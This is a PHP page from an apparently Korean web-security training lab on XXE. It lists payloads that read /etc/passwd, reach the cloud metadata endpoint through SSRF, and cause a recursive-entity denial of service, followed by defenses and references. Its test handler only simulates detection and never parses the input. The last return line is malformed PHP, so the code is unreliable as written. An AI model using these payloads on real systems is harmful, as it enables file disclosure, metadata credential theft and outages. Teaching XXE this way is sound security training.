<?php
// 출력 버퍼링 시작 (헤더 전송 문제 방지)
ob_start();

// 세션 시작 (TestPage 전에)
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . "/../db.php";
require_once __DIR__ . "/../utils.php";

// 로그인 확인
if (!is_logged_in()) {
    header("Location: ../login.php");
    exit();
}

require_once 'TestPage.php';

// 1. 페이지 설정
$page_title = 'XXE (XML External Entity)';
$description = '<p><strong>XXE (XML External Entity)</strong>는 XML 파서가 외부 엔티티를 처리할 때 발생하는 취약점입니다.</p>
<p>로컬 파일 읽기, SSRF 공격, DoS 공격 등이 가능합니다.</p>';

// 2. 페이로드 정의
$payloads = [
    'file' => [
        'title' => '파일 읽기 페이로드',
        'description' => '외부 엔티티를 통해 로컬 파일을 읽습니다.',
        'payloads' => [
            '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&file;</data>
</root>'
        ]
    ],
    'ssrf' => [
        'title' => 'SSRF 공격 페이로드',
        'description' => '외부 엔티티를 통해 내부 네트워크에 요청을 보냅니다.',
        'payloads' => [
            '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
    <data>&ssrf;</data>
</root>'
        ]
    ],
    'dos' => [
        'title' => 'DoS 공격 페이로드',
        'description' => '재귀적인 엔티티 정의를 통해 XML 파서를 과부하시켜 DoS를 유발합니다.',
        'payloads' => [
            '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>
    <data>&lol3;</data>
</root>'
        ]
    ]
];

// 3. 방어 방법 정의
$defense_methods = [
    "<strong>외부 엔티티 비활성화:</strong> `libxml_disable_entity_loader(true)` 사용 (PHP)",
    "<strong>안전한 파서 설정:</strong> `LIBXML_NOENT`, `LIBXML_DTDLOAD` 플래그 제거",
    "<strong>입력 검증:</strong> `DOCTYPE`, `ENTITY` 선언 필터링",
    "<strong>JSON 사용:</strong> 가능한 경우 XML 대신 JSON 사용",
    "<strong>네트워크 분리:</strong> XML 파서를 격리된 환경에서 실행"
];

// 4. 참고 자료 정의
$references = [
    "OWASP - XXE Injection" => "https://owasp.org/www-community/attacks/XML_External_Entity_(XXE)_Injection",
    "PortSwigger - XXE injection" => "https://portswigger.net/web-security/xxe"
];

// 5. 테스트 폼 UI 정의
$xml_input = htmlspecialchars($_POST["payload"] ?? '');
$test_form_ui = <<<HTML
<form method="post" class="test-form">
    <h3>🧪 XXE 테스트</h3>
    <label for="payload">🎯 XML 데이터 입력:</label><br>
    <textarea id="payload" name="payload" placeholder="XML 데이터를 입력하세요...">{$xml_input}</textarea><br><br>
    <button type="submit" class="btn">XML 파싱</button>
</form>
HTML;

// 6. 테스트 로직 콜백 정의
$test_logic_callback = function($form_data) {
    $xml_input = $form_data['payload'] ?? '';
    $result = '';
    $error = '';

    if (empty($xml_input)) {
        $error = "XML 데이터를 입력해주세요.";
        return ['result' => '', 'error' => $error];
    }

    $response_sim = "[시뮬레이션] XXE 공격 분석\n";
    $response_sim .= "입력 XML: " . htmlspecialchars($xml_input) . "\n\n";

    // 교육 목적의 XXE 시뮬레이션
    if (strpos($xml_input, '<!ENTITY') !== false && strpos($xml_input, 'SYSTEM') !== false) {
        if (strpos($xml_input, 'file://') !== false) {
            $response_sim .= "🚨 XXE 공격 감지됨: 로컬 파일 읽기 시도\n";
            $response_sim .= "실제 환경에서는 /etc/passwd, 설정 파일 등이 노출될 수 있습니다.\n";
        } elseif (strpos($xml_input, 'http://') !== false || strpos($xml_input, 'https://') !== false) {
            $response_sim .= "🚨 XXE SSRF 공격 감지됨: 외부 서버 요청 시도\n";
            $response_sim .= "실제 환경에서는 내부 네트워크 스캔, AWS 메타데이터 접근 등이 가능합니다.\n";
        } elseif (strpos($xml_input, '<!ENTITY lol3') !== false) {
            $response_sim .= "🚨 XXE DoS 공격 감지됨: XML 폭탄 시도\n";
            $response_sim .= "실제 환경에서는 XML 파서가 과부하되어 서비스 거부가 발생할 수 있습니다.\n";
        } else {
            $response_sim .= "🚨 일반적인 XXE 공격 패턴 감지됨\n";
        }
    } elseif (strpos($xml_input, '<!DOCTYPE') !== false && strpos($xml_input, '[') !== false) {
        $response_sim .= "⚠️ DOCTYPE 선언 감지됨: 잠재적 XXE 공격 가능성\n";
        $response_sim .= "ENTITY 선언을 통한 추가 공격이 가능할 수 있습니다.\n";
    } else {
        $response_sim .= "✅ 안전한 XML 파싱 완료: 위험한 패턴이 감지되지 않았습니다.\n";
    }

    return ['result' => "<pre>{"$response_sim"}</pre>", 'error' => $error];
};

// 7. TestPage 인스턴스 생성 및 실행
$test_page = new TestPage($page_title, $description, $payloads, $defense_methods, $references, "XXE_Analysis.md");
$test_page->set_test_form($test_form_ui);
$test_page->set_test_logic($test_logic_callback);
$test_page->run();

